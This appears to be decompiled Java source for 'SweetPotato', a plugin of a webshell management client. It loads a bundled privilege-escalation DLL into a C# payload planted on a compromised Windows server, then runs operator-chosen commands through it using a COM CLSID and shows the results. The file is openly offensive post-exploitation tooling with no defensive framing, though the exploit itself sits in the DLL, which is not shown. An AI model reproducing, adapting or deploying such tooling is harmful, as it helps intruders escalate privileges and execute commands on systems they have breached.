/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="CShapDynamicPayload", Name="SweetPotato", DisplayName="SweetPotato")
public class SweetPotato
implements Plugin {
    private static final String CLASS_NAME = "SweetPotato.Run";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JButton loadButton = new JButton("Load");
    private final JButton runButton = new JButton("Run");
    private final JTextField commandTextField = new JTextField(35);
    private final JTextField clsidtTextField = new JTextField("4991D34B-80A1-4291-83B6-3328366B9097");
    private final JSplitPane splitPane;
    private final RTextArea resultTextArea = new RTextArea();
    private final JLabel clsidLabel = new JLabel("clsid :");
    private final JLabel commandLabel = new JLabel("command :");
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public SweetPotato() {
        this.splitPane = new JSplitPane();
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.loadButton);
        topPanel.add(this.clsidLabel);
        topPanel.add(this.clsidtTextField);
        topPanel.add(this.commandLabel);
        topPanel.add(this.commandTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter(){

            @Override
            public void componentResized(ComponentEvent e) {
                SweetPotato.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        this.commandTextField.setText("whoami");
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        block5: {
            if (!this.loadState) {
                try {
                    InputStream inputStream = this.getClass().getResourceAsStream("assets/SweetPotato.dll");
                    byte[] data = functions.readInputStream(inputStream);
                    inputStream.close();
                    if (this.payload.include(CLASS_NAME, data)) {
                        this.loadState = true;
                        GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
                        break block5;
                    }
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
                } catch (Exception e) {
                    Log.error(e);
                    GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "Loaded", "\u63d0\u793a", 1);
            }
        }
    }

    private void runButtonClick(ActionEvent actionEvent) {
        ReqParameter parameter = new ReqParameter();
        parameter.add("cmd", this.commandTextField.getText());
        parameter.add("clsid", this.clsidtTextField.getText().trim().getBytes());
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", parameter);
        this.resultTextArea.setText(this.encoding.Decoding(result));
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

